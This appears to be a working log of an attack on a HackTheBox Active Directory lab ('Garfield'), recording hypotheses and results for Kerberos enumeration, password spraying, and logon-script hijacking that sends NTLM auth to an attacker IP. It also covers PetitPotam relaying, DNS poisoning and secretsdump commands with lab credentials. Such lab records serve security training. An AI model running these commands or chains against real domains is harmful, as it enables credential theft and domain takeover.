hypothesis: Garfield reachable via machines_us-4 VPN
action: nmap full port scan TCP + targeted UDP
why: all 65535 TCP ports filtered, no UDP responses. Need release arena VPN.

hypothesis: Initial recon on Garfield
action: nmap -sC -sV on 10.129.16.228
evidence: DC01.garfield.htb — Windows Server 2019 AD DC. Ports: DNS(53), Kerberos(88), RPC(135), SMB(445), LDAP(389), RDP(3389), WinRM(5985). SMB signing required. Clock skew +8h. Domain: GARFIELD.

hypothesis: Anonymous/null access reveals domain users
action: Kerberos user enum with themed names
evidence: Valid users: administrator, j.arbuckle (both KDC_ERR_PREAUTH_FAILED). Disabled: guest, krbtgt. Invalid: admin, garfield, odie, nermal, arlene, jon, liz. j.arbuckle is a real domain user.

hypothesis: More themed Garfield usernames exist
action: Kerberos enum with 40+ names (naming patterns, service accounts, Garfield characters)
evidence: Found l.wilson (KDC_ERR_PREAUTH_FAILED = valid, preauth required). No AS-REP roastable accounts. Valid users: administrator, j.arbuckle, l.wilson.

hypothesis: j.arbuckle or l.wilson has a weak/themed password
action: Kerberos spray with 36 themed passwords (Garfield, Lasagna, IHateMondays, seasons, etc)
why: all KDC_ERR_PREAUTH_FAILED, no lockouts. Password is not a simple themed guess.

hypothesis: SMB null or LDAP anonymous reveals shares/users
action: SMB null (STATUS_ACCESS_DENIED on listShares), LDAP anonymous (operationsError 000004DC: requires authenticated bind for searches)
why: DC restricts both null SMB share listing and anonymous LDAP queries. Need authenticated access.

hypothesis: DNS zone transfer or RID cycling reveals additional info
action: dig axfr (denied), dig ANY (revealed 192.168.100.1 second IP), lookupsid (STATUS_ACCESS_DENIED on lsarpc)
evidence: Zone transfer denied. RID cycling blocked. BUT DNS ANY reveals DC has second IP 192.168.100.1 — internal network exists. Also found IPv6 dead:beef::605d:7d67:bb30:a026.

hypothesis: Additional DNS records reveal more hostnames/services
action: DNS subdomain brute (50 names) + SRV records
why: no subdomains found. SRV records only point to DC01. Single-DC environment.

hypothesis: j.arbuckle:Th1sD4mnC4t!@1978 are valid domain creds
action: SMB login with NTLM auth
evidence: SMB auth SUCCESS. Shares visible: ADMIN$, C$, IPC$, NETLOGON, SYSVOL. C$/ADMIN$ access suggests high privileges. WinRM returned 401 (not in Remote Management Users).

hypothesis: New IP 10.129.17.44 is reachable and is the same Garfield box
disproof: ping fails or nmap shows different services

hypothesis: j.arbuckle can get shell via alternative exec methods despite WMI denied
action: testing smbexec/atexec/psexec

hypothesis: j.arbuckle can execute commands via smbexec/psexec/atexec/wmiexec
action: tried all 4 impacket exec tools
why: All return rpc_s_access_denied or 'share not writable'. j.arbuckle has READ-ONLY access to ADMIN$/C$, not admin privileges. No write to any share. No RPC exec.

hypothesis: j.arbuckle still has read access to C$/ADMIN$ on new IP 10.129.17.44
action: crackmapexec --shares
why: No READ/WRITE on C$ or ADMIN$. Only IPC$, NETLOGON, SYSVOL readable. j.arbuckle is regular domain user, not privileged.

hypothesis: Bloodhound reveals ACL abuse path from j.arbuckle
action: bloodhound-python collection + ACE analysis
evidence: Attack chain: l.wilson->ForceChangePassword->l.wilson_adm->ForceChangePassword+WriteAccountRestrictions->RODC01$->ForceChangePassword->krbtgt_8245. RODC has Admin in RevealedUsers. BUT j.arbuckle/IT Support have NO outbound ACEs. Need l.wilson creds first.

hypothesis: LAPS/gMSA/ADCS/password-in-description available
action: LDAP queries for LAPS attrs, gMSA, ADCS enrollment, descriptions
why: No LAPS deployed, no gMSA accounts, no ADCS, descriptions are all stock.

hypothesis: RODC01 (192.168.100.2) is reachable from attacker
action: ping
why: 100% packet loss. Internal-only network, not routed to us.

hypothesis: j.arbuckle can write to SYSVOL scripts directory

evidence: Successfully wrote to garfield.htb\scripts\. printerDetect.bat is a logon script — can be replaced to coerce NTLM auth or execute commands as l.wilson.

hypothesis: Modified printerDetect.bat in SYSVOL to coerce NTLM auth to responder at 10.10.17.114
action: uploaded bat with net use + dir to \10.10.17.114\share
evidence: Script uploaded. Waiting for l.wilson logon to trigger. Responder running on tun0.

hypothesis: PetitPotam coercion captures useful NTLM hash
action: coercer with MS-EFSR against DC01
evidence: Captured DC01$ NTLMv2 hash via MS-EFSR EfsRpcAddUsersToFile. Machine hash not directly crackable but confirms coercion works. SMB signing blocks relay.

hypothesis: NTLM relay DC01$ to LDAP for RBCD delegation
action: ntlmrelayx with --delegate-access on SMB 445, coercing via PetitPotam

hypothesis: ntlmrelayx can bind port 445 and relay DC01$ to LDAP

hypothesis: ntlmrelayx can relay DC01$ to LDAP for RBCD
action: tried ntlmrelayx with --delegate-access, both user and system impacket versions
why: ntlmrelayx exits silently after 'Servers started' — ports never actually bind. Impacket threading issue in Docker background mode. Relay approach blocked by tooling, not target.

hypothesis: DC01 cannot connect back to us on port 445 via raw socket
action: raw socket listener on 445 + cme petitpotam
evidence: No connection in 20s. Yet earlier Responder (as root) DID receive DC01$ hashes via coercer. Discrepancy may be due to Responder binding on all interfaces or coercer using different coercion UNC path format.

hypothesis: printerDetect.bat is a GPO logon script that triggers on user login
action: waited 60s for hash, checked GPO config
why: No hash received. Script is in SYSVOL scripts/ but may not be assigned as GPO logon script. Also: GPO reveals PasswordComplexity=0, LockoutBadCount=0 — unlimited spray possible.

hypothesis: l.wilson password follows j.arbuckle pattern with character/theme variations
action: 77 pattern-based passwords sprayed against l.wilson and l.wilson_adm
why: All STATUS_LOGON_FAILURE. Password doesn't follow the same leet-speak pattern.

hypothesis: Raw ACL audit reveals paths Bloodhound missed
action: LDAP query with SD_FLAGS_OID for nTSecurityDescriptor on key objects
evidence: IT Support has WP|RP on 'member' attr of Allowed RODC PRG. j.arbuckle can add ANY user to the RODC password replication allow list. New attack chain: add Administrator to Allowed RODC PRG → force RODC replication → extract Administrator hash. Completely bypasses need for l.wilson.

hypothesis: IT Support WriteProp on bf9679a8 controls group membership
action: schema lookup
why: bf9679a8 = scriptPath, NOT member. The ACE gives WP on scriptPath of user objects. Can set logon scripts for l.wilson → NTLM capture.

hypothesis: l.wilson NTLMv2 hash crackable with rockyou/rules/themed/darkc0de
action: john with rockyou, rockyou+best64 rules, 1944 themed passwords, darkc0de, keyboard walks
why: Hash not cracked with any wordlist. Password is custom/complex despite complexity=OFF. Need either bigger wordlist or different approach to get NT hash.

hypothesis: Reverse shell via scriptPath bat works
action: uploaded PS base64 revshell bat, waited 4 min
why: No callback. Likely AMSI/AV blocking PowerShell execution. NTLM capture bat DID work, proving scriptPath execution works.

hypothesis: Box IP changed from 10.129.16.228 to 10.129.17.44

evidence: 10.129.17.44 responds, DC01.garfield.htb same domain. Old IP unreachable.

hypothesis: Bat redirect output to UNC SMB share works
action: printerDetect.bat with whoami > \attacker\share\info.txt
why: No connection to smbserver. UNC redirect in logon script context doesn't trigger SMB connection like net use/dir does. Need different exfil method.

hypothesis: l.wilson scriptPath logon script still fires after initial capture
action: restored NTLM capture bat, waited 90s with responder
why: No new hashes captured. HTB simulated logon may have stopped or has longer interval. We already have the NTLMv2 hash from earlier capture.

hypothesis: l.wilson logon simulation fires on fresh box instance within 10 min
action: set scriptPath + uploaded bat, polled 30x20s
why: No logon after 10 min on fresh instance. Either simulation interval is very long, or scriptPath logon scripts aren't processed in the simulation.

hypothesis: ntlmrelayx can relay DC01$ PetitPotam to LDAP for RBCD
action: tried ntlmrelayx multiple ways - ports never bind despite claiming started
evidence: Machine account FAKEPC$ created. ntlmrelayx SMB server has threading bug - port 445 never actually opens despite 'Servers started' message. Raw socket/smbserver.py/responder all bind 445 fine. HTTP coercion (WebDAV) not viable - WebClient not running on DC01. Need to either patch ntlmrelayx or write custom relay.

hypothesis: Logon script simulation fires on fresh box
action: polled 30x20s (10 min) on fresh instance 10.129.17.46
why: No logon detected. scriptPath set on both l.wilson and l.wilson_adm. Bat uploaded. Either simulation doesn't process scriptPath, or interval is very long (>10min).

hypothesis: Relay DC01$ SMB auth to LDAP for RBCD
action: ntlmrelayx (fixed with sleep infinity pipe) + PetitPotam coercion
why: SMB client requested signing - LDAP relay fails. Error: 'The client requested signing. Relaying to LDAP will not work!' Must try LDAPS instead.

hypothesis: Relay DC01$ to LDAPS bypasses signing issue
action: ntlmrelayx -t ldaps:// + PetitPotam coercion
why: LDAPS channel binding enforced: 'socket ssl wrapping error: Connection reset by peer'. Both LDAP (signing) and LDAPS (channel binding) relay paths are dead.

hypothesis: VBS ADSI SetPassword is the correct mechanism for ForceChangePassword via scriptPath
action: uploaded reset.vbs + printerDetect.bat calling it, polling for result

hypothesis: Logon simulation processes scriptPath on fresh instance (3rd attempt)
action: setup.sh + poll.sh for 20 min on 10.129.17.33
why: 20 minutes polling, zero captures from responder, no result.txt created, no password change. Tried across 3 box instances. Logon scripts are NOT processed by the simulation. scriptPath write must serve a different purpose.

hypothesis: ADIDNS records created via LDAP resolve in DNS
action: Created wpad, *, and pwned records via LDAP - all show success in LDAP but DNS returns NXDOMAIN
why: LDAP add succeeds but DNS doesn't serve the records. Possible causes: wrong binary format (TTL byte order?), DNS negative caching, or zone serial mismatch. Need to match exact DC01 record format and use fresh hostname.

hypothesis: ADIDNS records with j.arbuckle ownership resolve in DNS
action: created fresh2 record with exact DC01 byte pattern, owned by j.arbuckle
why: Record created successfully in LDAP but DNS returns NXDOMAIN. DC01 record owned by SYSTEM, ours by j.arbuckle. DNS service may only serve SYSTEM-owned records, or the DACL doesn't grant read to DNS service.

hypothesis: Wildcard DNS via krbrelayx dnstool.py resolves correctly
action: dnstool.py add *.garfield.htb -> 10.10.17.114
evidence: Wildcard resolves! Any *.garfield.htb now points to our IP. Combined with responder/ntlmrelayx, any process accessing a non-existent hostname will auth to us.

hypothesis: Wildcard DNS + ntlmrelayx captures auth from DC processes
action: wildcard *.garfield.htb → our IP, ntlmrelayx on 445+80, waited 5+ min
why: Zero traffic. DC isn't querying any non-existent hostnames. No passive DNS traffic to capture.

hypothesis: Modify RODC01 DNS to redirect replication traffic

why: insufficientAccessRights. RODC01 DNS record owned by SYSTEM, can't modify.

hypothesis: ADIDNS records via dnstool.py resolve on fresh instance 10.129.17.70
action: dnstool.py added * and pwned records, LDAP confirms they exist but DNS returns NXDOMAIN
why: Records in LDAP but DNS won't serve them. Same dnstool.py worked on previous instance. Trying Kerberos-authenticated nsupdate (GSS-TSIG) as alternative — got Kerberos TGT successfully.

evidence: pwned.garfield.htb resolves to 10.10.17.114. Full chain: scriptPath=\\pwned.garfield.htb\share\script.bat + DNS resolution + smbserver serving bat + VBS password reset. All components verified working. Waiting for l.wilson logon.

hypothesis: Adding printer via RPC triggers printerDetect.bat

why: All printer operations return ACCESS_DENIED or INVALID_PRINTER_NAME. j.arbuckle has no print management rights. No GPO scripts.ini found, no scheduled tasks in GPO Preferences.

action: crackmapexec smb 10.129.16.228 -u l.wilson -p wordlist.txt (wordlist: Lasagna1, IHateMondays, Garfield, Odie123, Nermal1, Pooky123, ArlenE1, lasagna, mondays, ihatemondays, GarfieldCat, L4sagna, Monday1, etc.) — no lockout so full spray is safe

hypothesis: l.wilson's password is a Garfield-themed word meeting 7-char min with no complexity — spraying is safe with lockout disabled
action: First respawn the box (new IP). Then: crackmapexec smb <new_ip> -u l.wilson -p exploits/liz_wordlist.txt --no-bruteforce. If no hit, expand wordlist with more Garfield lore (Arlene, Pooky, Binky, NormalTheKitten, JonArbuckle, etc.) and also try kerbrute for speed. On success, immediately execute ACL chain: net rpc password l.wilson_adm via l.wilson creds.
why: Wordlist exhausted but password guessing approach is still viable — the password likely uses a pattern or theme not covered by current wordlist. Consider: (1) AS-REP roasting l.wilson if pre-auth is disabled, (2) Kerberoasting if l.wilson has SPNs, (3) checking if j.arbuckle creds can enumerate l.wilson's description or other LDAP attributes that leak password hints, (4) broader mutation rules with hashcat/john on a base wordlist. The spray mechanism works and lockout is not an issue — the wordlist content is the gap.

hypothesis: j.arbuckle has WriteProp on msDS-KeyCredentialLink for l.wilson — enabling shadow credentials attack to get l.wilson's TGT via PKINIT without knowing the password
action: faketime +8h pywhisker -d garfield.htb -u j.arbuckle -p <password> --target l.wilson --action add --dc-ip 10.129.17.178. If pywhisker not installed: pip install pywhisker. If ADCS/PKINIT not available, the add may succeed but auth will fail — check certipy or gettgtpkinit.py for PKINIT support. Alternative: raw LDAP modify with ldap3 to write msDS-KeyCredentialLink directly.
why: j.arbuckle does not have WriteProp permission on msDS-KeyCredentialLink for l.wilson. The DC returned INSUFF_ACCESS_RIGHTS (problem 4003), which is an ACL enforcement — not a syntax or protocol issue. Shadow credentials via this user->target pair is structurally blocked.

hypothesis: WinRM relay via PetitPotam - ntlmrelayx to http://DC01:5985/wsman

hypothesis: Hyper-V vmrdp port 2179 provides VM console access to RODC01
action: nmap fingerprint + python banner grab + xfreerdp attempt
why: Port 2179 is Hyper-V VM Connect protocol (not RDP). Accepts connections but requires proprietary Windows Hyper-V management tools. Not exploitable from Linux. No banner, nmap cannot fingerprint.

hypothesis: ADWS on port 9389 exposes AD operations or configuration data not available through LDAP — specifically, PowerShell AD cmdlet equivalents that may allow password reset (ForceChangePassword) or reveal attributes filtered from standard LDAP queries
action: Use Python to connect to port 9389 with .NET Message Framing. Try: 1) ldapsearch on 9389 to see if it speaks LDAP, 2) check if bloodyAD or impacket have ADWS modules, 3) try raw WCF/SOAP probing with curl or custom Python — ADWS uses SOAP over net.tcp. Key question: can j.arbuckle invoke Set-ADAccountPassword equivalent via ADWS to force-change l.wilson password (bypassing LDAP ACL checks)?
why: ADWS uses WCF/SOAP over net.tcp with mandatory Windows Negotiate (SPNEGO/Kerberos) authentication at the transport layer. No Linux-native tooling exists to interact with it from this environment. The protocol requires a full .NET WCF client stack or PowerShell with AD module — neither available. ADWS is an alternative transport for the same AD operations with the same ACLs, so even if reachable, it would not bypass LDAP access controls for j.arbuckle.

hypothesis: j.arbuckle can enumerate scheduled tasks via ITaskSchedulerService RPC, revealing a task that processes logon scripts or scriptPath — knowing its trigger lets us force-fire it
action: Use impacket TSCH RPC bindings to enumerate tasks: faketime +8h python3 -c 'from impacket.dcerpc.v5 import tsch; ...' connecting to 10.129.17.178 as j.arbuckle. Alternatively: faketime +8h impacket-atexec -just-query garfield.htb/j.arbuckle:'Th1sD4mnC4t!@1978'@10.129.17.178 or write a short script using impacket's tsch.hSchRpcEnumTasks() to list \\path tasks. If atexec lacks query mode, use rpcclient or a custom impacket script hitting the ITaskSchedulerService endpoint to call SchRpcEnumFolders + SchRpcEnumTasks on root folder.
why: j.arbuckle lacks read permissions on ITaskSchedulerService. SchRpcEnumTasks returns rpc_s_access_denied at root level, and the pipe is disconnected by the server after the denied call, preventing any further task enumeration. This is a permission-based hard block - non-admin users typically cannot enumerate tasks on a DC.

hypothesis: RODC01$ machine account has replication rights to pull Administrator's secrets from DC01 via DCSync, since Administrator is in msDS-RevealedUsers (cached on RODC)
branch: RODC01$ DCSync for Administrator via DRSUAPI
action: faketime '+8 hours' /home/hacker/.local/bin/secretsdump.py 'GARFIELD/RODC01$:N3wR0dcP@ss!@10.129.17.178' -just-dc-user Administrator
why: RODCs do not have standard replication rights (DS-Replication-Get-Changes / DS-Replication-Get-Changes-All). DCSync requires these extended rights which are not granted to RODC machine accounts by default. The RODC can only cache credentials for allowed accounts via its own filtered replication mechanism, not via DRSUAPI secretsdump. This is a structural limitation of the RODC role.

One of the four possible Kerberos salt formats (GARFIELD.HTBkrbtgt, GARFIELD.HTBkrbtgt_8245, GARFIELD.HTBhost/rodc01.garfield.htb, garfield.htbkrbtgt_8245) will produce the correct AES256 key for krbtgt_8245 with password RodcKrbtgt2026!, allowing keylistattack to extract Administrator's NT hash from DC01

hypothesis: keylistattack salt bruteforce with PBKDF2-derived keys
why: All 4 salt variants failed. PBKDF2 is wrong derivation - Kerberos uses RFC3962 string-to-key. But impacket string_to_key also failed previously. bloodyAD may not set password correctly.

hypothesis: l.wilson_adm can modify RODC01$ userAccountControl via WriteAccountRestrictions extended right to add TRUSTED_FOR_DELEGATION flag (0x80000), enabling unconstrained delegation for S4U ticket capture
action: Connect WinRM as l.wilson_adm to 10.129.17.158 (or use bloodyAD/ldapmodify). Modify RODC01$ userAccountControl to add TRUSTED_FOR_DELEGATION: Set-ADComputer RODC01 -Add @{userAccountControl=$((Get-ADComputer RODC01).userAccountControl + 0x80000)}. Verify with Get-ADComputer RODC01 -Properties userAccountControl. Then capture TGT via PetitPotam coercion to unconstrained RODC01$.
why: Active Directory enforces that PARTIAL_SECRETS_ACCOUNT (RODC) computer objects cannot have TRUSTED_FOR_DELEGATION (unconstrained delegation) flag set. This is a structural AD constraint, not a permissions issue. The flag combination is rejected with 'Invalid argument' even though l.wilson_adm has proven write access to userAccountControl. Additionally, changing the account type away from RODC is blocked by insufficient access rights.
